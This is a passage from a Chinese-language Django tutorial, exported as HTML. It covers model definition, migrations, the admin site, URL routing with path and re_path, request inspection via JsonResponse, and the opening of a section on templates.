<span style="color: #a020f0;">from</span> django.db <span style="color: #a020f0;">import</span> models

<span style="color: #b22222;"># </span><span style="color: #b22222;">user&#34920;&#27169;&#22411;</span>
<span style="color: #a020f0;">class</span> <span style="color: #228b22;">User</span>(models.Model):
    <span style="color: #a020f0;">class</span> <span style="color: #228b22;">Meta</span>:
        <span style="color: #a0522d;">db_table</span> = <span style="color: #8b2252;">"user"</span>
    <span style="color: #483d8b;">id</span> = models.AutoField(primary_key=<span style="color: #008b8b;">True</span>)
    <span style="color: #a0522d;">name</span> = models.CharField(max_length=48,null=<span style="color: #008b8b;">False</span>)
    <span style="color: #a0522d;">email</span> = models.CharField(max_length=64,unique=<span style="color: #008b8b;">True</span>,null=<span style="color: #008b8b;">False</span>)
    <span style="color: #a0522d;">password</span> = models.CharField(max_length=128,null=<span style="color: #008b8b;">False</span>)

    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">__repr__</span>(<span style="color: #a020f0;">self</span>):
        <span style="color: #a020f0;">return</span> <span style="color: #8b2252;">"&lt;user {} {}&gt;"</span>.<span style="color: #483d8b;">format</span>(<span style="color: #a020f0;">self</span>.<span style="color: #483d8b;">id</span>,<span style="color: #a020f0;">self</span>.name)

    <span style="color: #a0522d;">__str__</span> = __repr__
</pre>
</div>

<p>
Meta类的使用，参考<a href="https://docs.djangoproject.com/en/1.11/ref/models/options/#django.db.models.Options.db_table">https://docs.djangoproject.com/en/1.11/ref/models/options/#django.db.models.Options.db_table</a>
</p>

<ol class="org-ol">
<li><b>迁移Migration</b>
<ul class="org-ul">
<li>迁移：从模型定义生成数据库的表</li>
</ul></li>
</ol>


<ol class="org-ol">
<li><p>
生成迁移文件。执行 <code>python manage.py makemigrations</code>
</p>

<div class="org-src-container">
<pre class="src src-cmd">(venv) D:\MyPythonUse\DjangoWeb&gt;python manage.py makemigrations
Migrations for 'user':
user\migrations\0001_initial.py
    - Create model User

生成如下文件
user
├─ migrations
    ├─  0001_initial.py
    └─  __init__.py
</pre>
</div>

<ul class="org-ul">
<li>修改MOdel类，还需要调用 <code>python manage.py makemigrations</code> ，然后migrate，迁移文件的序号会增加。</li>

<li>注意：
<ol class="org-ol">
<li>迁移的应用必须在settings.py的INSTALLED_APPS中注册。</li>
<li>不要谁便删除这些迁移文件，因为后面的改动都是要依据这些迁移文件的。</li>
</ol></li>

<li>生成的迁移文件0001_initial.py内容如下：</li>
</ul>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">from</span> django.db <span style="color: #a020f0;">import</span> migrations, models


<span style="color: #a020f0;">class</span> <span style="color: #228b22;">Migration</span>(migrations.Migration):

    <span style="color: #a0522d;">initial</span> = <span style="color: #008b8b;">True</span>

    <span style="color: #a0522d;">dependencies</span> = [
    ]

    <span style="color: #a0522d;">operations</span> = [
        migrations.CreateModel(
            name=<span style="color: #8b2252;">'User'</span>,
            fields=[
                (<span style="color: #8b2252;">'id'</span>, models.AutoField(primary_key=<span style="color: #008b8b;">True</span>, serialize=<span style="color: #008b8b;">False</span>)),
                (<span style="color: #8b2252;">'name'</span>, models.CharField(max_length=48)),
                (<span style="color: #8b2252;">'email'</span>, models.CharField(max_length=64, unique=<span style="color: #008b8b;">True</span>)),
                (<span style="color: #8b2252;">'password'</span>, models.CharField(max_length=128)),
            ],
            options={
                <span style="color: #8b2252;">'db_table'</span>: <span style="color: #8b2252;">'user'</span>,
            },
        ),
    ]
</pre>
</div></li>

<li>执行迁移生成数据库的表 <code>python manage.py migrate</code>

<ul class="org-ul">
<li>执行了迁移，还同时生成了admin管理用的表。</li>
<li>查看数据库，user表创建好了，字段设置完全正确。</li>
</ul></li>
</ol>
</div>
</div>
</div>
<div id="outline-container-h:de578544-d4f2-4706-ad64-c819d3210959" class="outline-3">
<h3 id="h:de578544-d4f2-4706-ad64-c819d3210959">Django后台管理</h3>
<div class="outline-text-3" id="text-h:de578544-d4f2-4706-ad64-c819d3210959">
<p>
1、 <b>创建管理员</b>
</p>

<p>
命令
</p>
<div class="org-src-container">
<pre class="src src-sh">python manage.py createsuperuser
<span style="color: #b22222;">#</span><span style="color: #b22222;">&#31649;&#29702;&#20250;&#29992;&#25143;&#21517;admin &#23494;&#30721;adminadmin</span>
</pre>
</div>

<p>
范例
</p>
<div class="org-src-container">
<pre class="src src-sh">python manage.py createsuperuser

Username: admin
Email address: admin@admin.com
Password: 
<span style="color: #0000ff;">Password</span> (again): 
The password is too similar to the email address.
</pre>
</div>

<p>
会在auth_user表中创建admin用户
</p>
<div class="org-src-container">
<pre class="src src-sh">mysql&gt; select username,password from auth_user;
| admin    | pbkdf2_sha256$<span style="color: #a0522d;">1000000</span>$<span style="color: #a0522d;">Jxxxxx</span>$<span style="color: #a0522d;">xxxxxxxxxxxxxxxxxx</span>= |
</pre>
</div>

<p>
2、 <b>本地化</b>
</p>

<p>
settings.py中可以设置语言、时区。语言名称可以查看=django\contrib\admin\locale=目录
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#20462;&#25913;blog/settings.py&#25991;&#20214;&#20013;&#23545;&#24212;&#21464;&#37327;</span>
<span style="color: #a0522d;">LANGUAGE_CODE</span> = <span style="color: #8b2252;">'en-us'</span> <span style="color: #b22222;">#</span><span style="color: #b22222;">'zh-Hans' </span>
<span style="color: #a0522d;">TIME_ZONE</span> = <span style="color: #8b2252;">'Asia/Shanghai'</span> <span style="color: #b22222;"># </span><span style="color: #b22222;">'UTC'</span>
<span style="color: #a0522d;">USE_TZ</span> = <span style="color: #008b8b;">True</span>
</pre>
</div>

<p>
3、 <b>启动WEB Server</b>
</p>
<div class="org-src-container">
<pre class="src src-sh">python manage.py runserver <span style="color: #b22222;">#</span><span style="color: #b22222;">&#40664;&#35748; 127.0.0.1:8000</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">python manage.py runserver 0.0.0.0:8000</span>
</pre>
</div>

<p>
访问<a href="http://127.0.0.1:8000/">http://127.0.0.1:8000/</a> 看到服务启动正常
</p>

<p>
访问<a href="http://127.0.0.1:8000/admin/">http://127.0.0.1:8000/admin/</a> 可以登录后台管理界面
</p>
<ul class="org-ul">
<li>注意：用户名密码为之前第一步创建管理员时设定的</li>
<li>用户名：admin   密码：adminadmin</li>
<li>可以在页面创建普通用户</li>
</ul>

<p>
4、 <b>注册应用模块</b>
</p>

<p>
注册后user可以被管理员用户在web界面进行增删改操作
</p>

<p>
登录后如果希望后来能够管理这些表，就需要在admin文件中注册对应的models
</p>

<p>
举例, 这里我们不写这些代码
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;">#</span><span style="color: #b22222;">models.py</span>
<span style="color: #a020f0;">from</span> django.db <span style="color: #a020f0;">import</span> models

<span style="color: #b22222;"># </span><span style="color: #b22222;">Create your models here.</span>
<span style="color: #a020f0;">class</span> <span style="color: #228b22;">Post</span>(models.Model):
    <span style="color: #a020f0;">class</span> <span style="color: #228b22;">meta</span>:
        <span style="color: #a0522d;">db_table</span>=<span style="color: #8b2252;">"a"</span>
    <span style="color: #a020f0;">pass</span>

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#22312;admin.py&#25991;&#20214;&#20013;&#27880;&#20876;</span>
<span style="color: #a020f0;">from</span> django.contrib <span style="color: #a020f0;">import</span> admin

<span style="color: #b22222;"># </span><span style="color: #b22222;">Register your models here.</span>
<span style="color: #a020f0;">from</span> .models <span style="color: #a020f0;">import</span> Post
admin.site.register(Post)
</pre>
</div>

<p>
登录成功后，可以看到注册的表了。
</p>
</div>
</div>
<div id="outline-container-h:2a94a3a7-cb99-4a99-a4d0-ddc8b8629169" class="outline-3">
<h3 id="h:2a94a3a7-cb99-4a99-a4d0-ddc8b8629169">路由（重要）</h3>
<div class="outline-text-3" id="text-h:2a94a3a7-cb99-4a99-a4d0-ddc8b8629169">
<p>
路由功能就是实现URL模式匹配和处理函数之间的映射。
</p>

<p>
路由配置要在项目的urls.py中配置，也可以多级配置，在每一个应用中，建立一个urls.py文件配置路由映射。
</p>

<p>
官方文档：
</p>
<ul class="org-ul">
<li>URL调度器: <a href="https://docs.djangoproject.com/zh-hans/5.2/topics/http/urls/">https://docs.djangoproject.com/zh-hans/5.2/topics/http/urls/</a></li>
<li>path函数: <a href="https://docs.djangoproject.com/en/5.2/ref/urls/#django.urls.path">https://docs.djangoproject.com/en/5.2/ref/urls/#django.urls.path</a></li>

<li>url函数(Django 2.x之前)
<ul class="org-ul">
<li>url(regex,view,kwargs=None,name=None) 进行模式匹配
<ol class="org-ol">
<li>regex: 正则表达式，与之匹配的URL会执行对应的第二个参数view</li>
<li>view: 用于执行与正则表达式匹配的URL请求</li>
<li>kwargs: 视图使用的字典类型的参数</li>
<li>name: 用来反向获取URL</li>
</ol></li>
</ul></li>
<li>path函数(2.x+)
<ul class="org-ul">
<li>path(route, view, kwargs=None, name=None)
<ul class="org-ul">
<li>对URL进行模式匹配</li>
<li>可以使用尖括号来捕获部分URL成分。一旦使用了尖括号提取成分，每一个成分都会变成一个 <b>实参</b></li>
<li><b>注入</b> 到视图函数中，视图函数必须增加形参接收</li>
<li>形参函数基本同url函数</li>
</ul></li>
</ul></li>
</ul>

<p>
还有一个re_path函数(2.x+)可以使用正则表达式，本质上就是url函数。
</p>

<p>
urls.py 内容如下
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">from</span> django.contrib <span style="color: #a020f0;">import</span> admin
<span style="color: #a020f0;">from</span> django.urls <span style="color: #a020f0;">import</span> path
<span style="color: #a020f0;">from</span> django.urls <span style="color: #a020f0;">import</span> re_path
<span style="color: #a020f0;">from</span> django.http <span style="color: #a020f0;">import</span> HttpResponse,HttpRequest

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">index</span>(request:HttpRequest):
    <span style="color: #8b2252;">"""&#35270;&#22270;&#20989;&#25968;&#65306;&#35831;&#27714;&#36827;&#26469;&#36820;&#22238;&#21709;&#24212;"""</span>
    <span style="color: #a0522d;">res</span> = HttpResponse(b<span style="color: #8b2252;">"Hello word xdd"</span>)
    <span style="color: #483d8b;">print</span>(res.charset) <span style="color: #b22222;">#</span><span style="color: #b22222;">utf-8</span>
    <span style="color: #a020f0;">return</span> res

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">test</span>(request, username, <span style="color: #483d8b;">id</span>):
    <span style="color: #483d8b;">print</span>(<span style="color: #483d8b;">type</span>(username), <span style="color: #483d8b;">type</span>(<span style="color: #483d8b;">id</span>))
    <span style="color: #a020f0;">return</span> HttpResponse(
        <span style="color: #8b2252;">'hello test page.username={}:{}, id={}:{}'</span>.<span style="color: #483d8b;">format</span>(
            username, <span style="color: #483d8b;">type</span>(username).<span style="color: #483d8b;">__name__</span>, <span style="color: #483d8b;">id</span>, <span style="color: #483d8b;">type</span>(<span style="color: #483d8b;">id</span>).<span style="color: #483d8b;">__name__</span>
        ))

<span style="color: #a0522d;">urlpatterns</span> = [
    path(<span style="color: #8b2252;">'admin/'</span>, admin.site.urls),
    path(<span style="color: #8b2252;">''</span>, index),
    <span style="color: #b22222;">#</span><span style="color: #b22222;">path('index', index) # index&#21487;&#20197;&#21305;&#37197;&#65307;index/&#19981;&#33021;&#21305;&#37197;</span>
    path(<span style="color: #8b2252;">'index/'</span>, index), <span style="color: #b22222;"># </span><span style="color: #b22222;">index index/ &#37117;&#21487;&#20197;&#21305;&#37197;&#65307;index/a&#19981;&#33021;&#21305;&#37197;</span>
    path(<span style="color: #8b2252;">'test/&lt;username&gt;/&lt;int:id&gt;'</span>, test)  <span style="color: #b22222;"># </span><span style="color: #b22222;">/test/tom/2 &#23454;&#21442;&#27880;&#20837;</span>
]
</pre>
</div>

<p>
<code>def test(request, *args, **kwargs)</code> ，那么数据将收集在kwargs中。
</p>

<p>
注意，在url.py中写视频函数不好，这里仅为了测试。
</p>

<p>
<b>请求信息测试和JSON响应</b>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">from</span> django.http <span style="color: #a020f0;">import</span> HttpResponse,HttpRequest,JsonResponse

<span style="color: #b22222;"># </span><span style="color: #b22222;">http://localhost:8000/?a=100&amp;b=abc</span>
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">index</span>(request:HttpRequest):
    <span style="color: #8b2252;">"""&#35270;&#22270;&#20989;&#25968;&#65306;&#35831;&#27714;&#36827;&#26469;&#36820;&#22238;&#21709;&#24212;"""</span>
    <span style="color: #483d8b;">print</span>(request.GET) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#26597;&#35810;&#23383;&#31526;&#20018;?a=100&amp;b=abc</span>
    <span style="color: #483d8b;">print</span>(request.POST)
    <span style="color: #483d8b;">print</span>(request.session)
    <span style="color: #483d8b;">print</span>(request.COOKIES)
    <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'-'</span> * 30)
    <span style="color: #a0522d;">keys</span> = (<span style="color: #8b2252;">'method'</span>, <span style="color: #8b2252;">'path_info'</span>, <span style="color: #8b2252;">'GET'</span>, <span style="color: #8b2252;">'POST'</span>) <span style="color: #b22222;"># </span><span style="color: #b22222;">&#37325;&#35201;&#23646;&#24615;</span>
    <span style="color: #a0522d;">items</span> = <span style="color: #483d8b;">dict</span>((k, <span style="color: #483d8b;">getattr</span>(request, k)) <span style="color: #a020f0;">for</span> k <span style="color: #a020f0;">in</span> keys)
    <span style="color: #a020f0;">return</span> JsonResponse(items)
</pre>
</div>

<ul class="org-ul">
<li>在项目中首页数使用HTML显示，为了加载速度快，一般多使用静态页面。如果首页内容多，还有部分数据需要变化，将变化部分使用AJAX技术从后台获取数据。</li>
<li>本次，为了学习模板技术，只将首页采用Django的模板技术实现。</li>
</ul>


<p>
范例
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">from</span> django.contrib <span style="color: #a020f0;">import</span> admin
<span style="color: #a020f0;">from</span> django.urls <span style="color: #a020f0;">import</span> path, re_path <span style="color: #b22222;">#</span><span style="color: #b22222;">url</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">from django.shortcuts import HttpResponse #WSGI&#24555;&#25463;&#26041;&#27861;&#65292;&#36824;&#21487;&#20197;&#20174;django.http&#20013;&#23548;&#20837;</span>
<span style="color: #a020f0;">from</span> django.http <span style="color: #a020f0;">import</span> HttpResponse, HttpRequest
<span style="color: #b22222;"># </span><span style="color: #b22222;">HttpRequest&#26159;&#29238;&#31867;&#65307;WSGIRequest&#26159;&#23376;&#31867;</span>

<span style="color: #b22222;"># </span><span style="color: #b22222;">view&#20989;&#25968;, &#26681;&#25454;&#35831;&#27714;&#65292;&#36820;&#22238;&#30456;&#24212;&#30340;&#32467;&#26524;</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">function-based view =&gt; FBV</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#35201;&#27714;&#24517;&#39035;&#25552;&#20379;&#33267;&#23569;&#19968;&#20010;&#21442;&#25968;&#65292;&#31532;&#19968;&#20010;&#21442;&#25968;&#35299;&#20915;request&#27880;&#20837;</span>
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">index</span>(request:HttpRequest):
    <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'-'</span>*30)
    <span style="color: #483d8b;">print</span>(request)
    <span style="color: #483d8b;">print</span>(request.path_info)
    <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'-'</span>*30)
    <span style="color: #b22222;"># </span><span style="color: #b22222;">response = HttpResponse('&#36825;&#26159;&#39318;&#39029;', charset='gbk') # makebytes() &#32534;&#30721;&#65311; ; charset='utf-8'; DEFAULT_CHARSET &#22312;settings&#20013;&#20840;&#23616;&#37197;&#32622;</span>
    <span style="color: #a0522d;">response</span> = HttpResponse(<span style="color: #8b2252;">'&#36825;&#26159;&#39318;&#39029;'</span>)
    <span style="color: #483d8b;">print</span>(response.charset)
    <span style="color: #a020f0;">return</span> response

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#19981;&#21516;url path &#21644;&#19981;&#21516;&#30340;&#20989;&#25968;&#20043;&#38388;&#30340;&#23545;&#24212;&#20851;&#31995;&#65292;&#19981;&#31649;&#20160;&#20040;&#20989;&#25968;&#25191;&#34892;&#65292;&#26368;&#32456;&#37117;&#24212;&#35813;&#36820;&#22238;&#36820;&#22238;&#20540;(&#20934;&#22791;&#36820;&#22238;&#30340;&#20869;&#23481;)</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#36335;&#24452;&#21305;&#37197;&#65306;&#23436;&#20840;&#21305;&#37197;&#12289;&#27169;&#24335;&#21305;&#37197;</span>
<span style="color: #a0522d;">urlpatterns</span> = [
    path(<span style="color: #8b2252;">'admin/'</span>, admin.site.urls), <span style="color: #b22222;"># </span><span style="color: #b22222;">/admin/ &#36335;&#24452;&#23545;&#24212;&#65292;&#22810;&#32423;url&#22788;&#29702;</span>
    path(<span style="color: #8b2252;">''</span>, index), <span style="color: #b22222;">#  </span><span style="color: #b22222;">'/' =&gt; index &#20989;&#25968;&#65292; request&#23454;&#21442;</span>
    <span style="color: #b22222;"># </span><span style="color: #b22222;">path('index', index), # '/index' OK ; '/index/' Wrong</span>
    path(<span style="color: #8b2252;">'index/'</span>, index), <span style="color: #b22222;"># </span><span style="color: #b22222;">'/index' 301 '/index/'; '/index/' OK</span>
]
<span style="color: #b22222;"># </span><span style="color: #b22222;">/index =&gt; server &#31471;&#65292;&#20998;&#26512;url&#65292;&#36820;&#22238;&#19968;&#20010;&#26032;&#36335;&#24452;301 location /index/</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">path route&#23450;&#20041;&#19981;&#20197;/&#32467;&#23614;&#65292;&#24448;&#24448;&#20195;&#34920;&#23601;&#26159; ^index$</span>
</pre>
</div>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">from</span> django.contrib <span style="color: #a020f0;">import</span> admin
<span style="color: #a020f0;">from</span> django.urls <span style="color: #a020f0;">import</span> path, re_path <span style="color: #b22222;">#</span><span style="color: #b22222;">url</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">from django.shortcuts import HttpResponse #WSGI&#24555;&#25463;&#26041;&#27861;&#65292;&#36824;&#21487;&#20197;&#20174;django.http&#20013;&#23548;&#20837;</span>
<span style="color: #a020f0;">from</span> django.http <span style="color: #a020f0;">import</span> HttpResponse, HttpRequest, JsonResponse
<span style="color: #a020f0;">from</span> django.core.handlers.wsgi <span style="color: #a020f0;">import</span> WSGIRequest
<span style="color: #b22222;"># </span><span style="color: #b22222;">HttpRequest&#26159;&#29238;&#31867;&#65307;WSGIRequest&#26159;&#23376;&#31867;</span>

<span style="color: #b22222;"># </span><span style="color: #b22222;">view&#20989;&#25968;, &#26681;&#25454;&#35831;&#27714;&#65292;&#36820;&#22238;&#30456;&#24212;&#30340;&#32467;&#26524;</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">function-based view =&gt; FBV</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#35201;&#27714;&#24517;&#39035;&#25552;&#20379;&#33267;&#23569;&#19968;&#20010;&#21442;&#25968;&#65292;&#31532;&#19968;&#20010;&#21442;&#25968;&#35299;&#20915;request&#27880;&#20837;</span>
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">index</span>(request:WSGIRequest):
    <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'-'</span>*30)
    <span style="color: #483d8b;">print</span>(request)
    <span style="color: #483d8b;">print</span>(request.path_info)
    <span style="color: #483d8b;">print</span>(request.GET) <span style="color: #b22222;"># </span><span style="color: #b22222;">query string &#26597;&#35810;&#23383;&#31526;&#20018;&#30340;&#23553;&#35013; MultiValueDict &#29233;&#22909; interest=music&amp;interest=movie</span>
    <span style="color: #483d8b;">print</span>(request.POST) <span style="color: #b22222;"># </span><span style="color: #b22222;">QueryDict MultiValueDict request body</span>
    <span style="color: #483d8b;">print</span>(request.COOKIES)
    <span style="color: #483d8b;">print</span>(request.session) <span style="color: #b22222;"># </span><span style="color: #b22222;">session</span>
    <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'-'</span>*30)

    <span style="color: #a0522d;">keys</span> = (<span style="color: #8b2252;">'GET'</span>, <span style="color: #8b2252;">"POST"</span>, <span style="color: #8b2252;">'COOKIES'</span>, <span style="color: #8b2252;">'path'</span>, <span style="color: #8b2252;">'method'</span>)
    <span style="color: #b22222;"># </span><span style="color: #b22222;"># response = HttpResponse('&#36825;&#26159;&#39318;&#39029;', charset='gbk') # makebytes() &#32534;&#30721;&#65311; ; charset='utf-8'; DEFAULT_CHARSET &#22312;settings&#20013;&#20840;&#23616;&#37197;&#32622;</span>
    <span style="color: #b22222;"># </span><span style="color: #b22222;">response = HttpResponse('&#36825;&#26159;&#39318;&#39029;')</span>
    <span style="color: #b22222;"># </span><span style="color: #b22222;">print(response.charset)</span>
    <span style="color: #a0522d;">response</span> = JsonResponse(
        <span style="color: #483d8b;">dict</span>(<span style="color: #483d8b;">map</span>(<span style="color: #a020f0;">lambda</span> k: (k, <span style="color: #483d8b;">getattr</span>(request, k)), keys))
    )
    <span style="color: #a020f0;">return</span> response

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">test</span>(request, clz, uid):
    <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'='</span>*30)
    <span style="color: #b22222;"># </span><span style="color: #b22222;">print(request.path)</span>
    <span style="color: #483d8b;">print</span>(clz, uid, <span style="color: #483d8b;">type</span>(clz), <span style="color: #483d8b;">type</span>(uid))
    <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'='</span>*30)
    <span style="color: #a020f0;">return</span> HttpResponse(<span style="color: #8b2252;">'abc~~~~'</span>)

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#19981;&#21516;url path &#21644;&#19981;&#21516;&#30340;&#20989;&#25968;&#20043;&#38388;&#30340;&#23545;&#24212;&#20851;&#31995;&#65292;&#19981;&#31649;&#20160;&#20040;&#20989;&#25968;&#25191;&#34892;&#65292;&#26368;&#32456;&#37117;&#24212;&#35813;&#36820;&#22238;&#36820;&#22238;&#20540;(&#20934;&#22791;&#36820;&#22238;&#30340;&#20869;&#23481;)</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#36335;&#24452;&#21305;&#37197;&#65306;&#23436;&#20840;&#21305;&#37197;&#12289;&#27169;&#24335;&#21305;&#37197;</span>
<span style="color: #a0522d;">urlpatterns</span> = [
    path(<span style="color: #8b2252;">'admin/'</span>, admin.site.urls), <span style="color: #b22222;"># </span><span style="color: #b22222;">/admin/ &#36335;&#24452;&#23545;&#24212;&#65292;&#22810;&#32423;url&#22788;&#29702;</span>
    path(<span style="color: #8b2252;">''</span>, index), <span style="color: #b22222;">#  </span><span style="color: #b22222;">'/' =&gt; index &#20989;&#25968;&#65292; request&#23454;&#21442;</span>
    <span style="color: #b22222;"># </span><span style="color: #b22222;">path('index', index), # '/index' OK ; '/index/' Wrong</span>
    path(<span style="color: #8b2252;">'index/'</span>, index), <span style="color: #b22222;"># </span><span style="color: #b22222;">'/index' 301 '/index/'; '/index/' OK</span>
    path(<span style="color: #8b2252;">'test/&lt;clz&gt;/&lt;int:uid&gt;'</span>, test),
]
<span style="color: #b22222;"># </span><span style="color: #b22222;">/index =&gt; server &#31471;&#65292;&#20998;&#26512;url&#65292;&#36820;&#22238;&#19968;&#20010;&#26032;&#36335;&#24452;301 location /index/</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">path route&#23450;&#20041;&#19981;&#20197;/&#32467;&#23614;&#65292;&#24448;&#24448;&#20195;&#34920;&#23601;&#26159; ^index$&#65307;&#20197;/&#32467;&#23614;&#65292;&#21487;&#33021;&#36824;&#26377;&#23376;&#30446;&#24405;&#12289;&#23376;&#25991;&#20214;</span>
</pre>
</div>

<div class="org-src-container">
<pre class="src src-sh">&#27983;&#35272;&#22120;&#35831;&#27714;  http://localhost:8000/index/?<span style="color: #a0522d;">id</span>=1&amp;<span style="color: #a0522d;">interest</span>=music&amp;<span style="color: #a0522d;">interest</span>=movie

<span style="color: #b22222;">#</span><span style="color: #b22222;">Django&#25191;&#34892;&#32467;&#26524;</span>
------------------------------
&lt;WSGIRequest: GET <span style="color: #8b2252;">'/index/?id=1&amp;interest=music&amp;interest=movie'</span>&gt;
/index/
&lt;QueryDict: {<span style="color: #8b2252;">'id'</span>: [<span style="color: #8b2252;">'1'</span>], <span style="color: #8b2252;">'interest'</span>: [<span style="color: #8b2252;">'music'</span>, <span style="color: #8b2252;">'movie'</span>]}&gt; <span style="color: #b22222;">#</span><span style="color: #b22222;">&#22810;&#20540;&#23383;&#20856;</span>
&lt;QueryDict: {}&gt;
{}
&lt;django.contrib.sessions.backends.db.SessionStore object at 0x000002383B0041A0&gt;
------------------------------
[03/Jun/2025 11:53:47] <span style="color: #8b2252;">"GET /index/?id=1&amp;interest=music&amp;interest=movie HTTP/1.1"</span> 200 104
</pre>
</div>

<div class="org-src-container">
<pre class="src src-sh">&#27983;&#35272;&#22120;&#35831;&#27714; http://localhost:8000/test/tt/123

<span style="color: #b22222;">#</span><span style="color: #b22222;">Django&#25191;&#34892;&#32467;&#26524;</span>
==============================
tt 123 &lt;class <span style="color: #8b2252;">'str'</span>&gt; &lt;class <span style="color: #8b2252;">'int'</span>&gt;
==============================
[03/Jun/2025 12:00:29] <span style="color: #8b2252;">"GET /test/tt/123 HTTP/1.1"</span> 200 7
</pre>
</div>
</div>
</div>
</section>
<section id="outline-container-h:82fc7377-e915-4d33-babe-aedf458c95eb" class="outline-2">
<h2 id="h:82fc7377-e915-4d33-babe-aedf458c95eb">Django模板技术</h2>
<div class="outline-text-2" id="text-h:82fc7377-e915-4d33-babe-aedf458c95eb">
<p>
如果使用react实现前端页面，其实Django就没有必须使用模板，它其实就是一个纯后台服务程序，接收请求，响应数据，前端接口设计就可以是纯粹的Restful风格。
</p>

<p>
模板的目的就是为了可视化，将数据按照一定布局格式输出，而不是为了数据处理，所以一般不会有复杂的处理逻辑。模板的引入实现了业务逻辑和显示格式的分离。这样，在开发中，就可以分工协作，页面开发完成页面布局设计，后台开发完成数据处理逻辑实现。
</p>

<ul class="org-ul">
<li>Python的模板引擎默认使用Django template language(DTL)构建</li>
</ul>

<p>
官方文档：<a href="https://docs.djangoproject.com/en/5.2/#the-template-layer">https://docs.djangoproject.com/en/5.2/#the-template-layer</a>
</p>
</div>
<div id="outline-container-h:38283099-00be-4757-b190-77db9c19230f" class="outline-3">
<h3 id="h:38283099-00be-4757-b190-77db9c19230f">由来</h3>
<div class="outline-text-3" id="text-h:38283099-00be-4757-b190-77db9c19230f">
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#26412;&#36136;&#19978;&#37117;&#35201;&#19968;&#20010;&#23383;&#31526;&#20018;&#65292;&#20063;&#23601;&#26159;&#35828;&#21482;&#33021;&#32473;HttpResponse&#26500;&#36896;&#20989;&#25968;&#25552;&#20379;&#20869;&#23481;&#23383;&#31526;&#20018;&#23601;&#21487;&#20197;&#20102;</span>
response = HttpResponse(<span style="color: #8b2252;">'&lt;html&gt;&lt;body&gt;&lt;h1 style="color:red"&gt;{}&lt;/h1&gt;&lt;div&gt;{}&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;'</span>.format(title, content))
</pre>
</div>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">from</span> django.contrib <span style="color: #a020f0;">import</span> admin
<span style="color: #a020f0;">from</span> django.urls <span style="color: #a020f0;">import</span> path, re_path <span style="color: #b22222;">#</span><span style="color: #b22222;">url</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">from django.shortcuts import HttpResponse #WSGI&#24555;&#25463;&#26041;&#27861;&#65292;&#36824;&#21487;&#20197;&#20174;django.http&#20013;&#23548;&#20837;</span>
<span style="color: #a020f0;">from</span> django.http <span style="color: #a020f0;">import</span> HttpResponse, HttpRequest, JsonResponse
<span style="color: #a020f0;">from</span> django.core.handlers.wsgi <span style="color: #a020f0;">import</span> WSGIRequest
<span style="color: #b22222;"># </span><span style="color: #b22222;">HttpRequest&#26159;&#29238;&#31867;&#65307;WSGIRequest&#26159;&#23376;&#31867;</span>

<span style="color: #b22222;"># </span><span style="color: #b22222;">view&#20989;&#25968;, &#26681;&#25454;&#35831;&#27714;&#65292;&#36820;&#22238;&#30456;&#24212;&#30340;&#32467;&#26524;</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">function-based view =&gt; FBV</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#35201;&#27714;&#24517;&#39035;&#25552;&#20379;&#33267;&#23569;&#19968;&#20010;&#21442;&#25968;&#65292;&#31532;&#19968;&#20010;&#21442;&#25968;&#35299;&#20915;request&#27880;&#20837;</span>
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">index</span>(request:WSGIRequest):
    <span style="color: #a0522d;">title</span> = <span style="color: #8b2252;">'&#26631;&#39064;&#27979;&#35797;'</span>
    <span style="color: #a0522d;">content</span> = <span style="color: #8b2252;">'&#36825;&#26159;&#20869;&#23481;'</span>
    <span style="color: #b22222;"># </span><span style="color: #b22222;">&#21709;&#24212;&#25253;&#25991;&#27491;&#25991;&#37096;&#20998;&#30340;&#23383;&#31526;&#20018;&#21487;&#20197;&#21160;&#24577;&#29983;&#25104;&#65292;&#20063;&#21487;&#20197;&#20174;&#25991;&#20214;&#20013;&#35835;&#21462;</span>
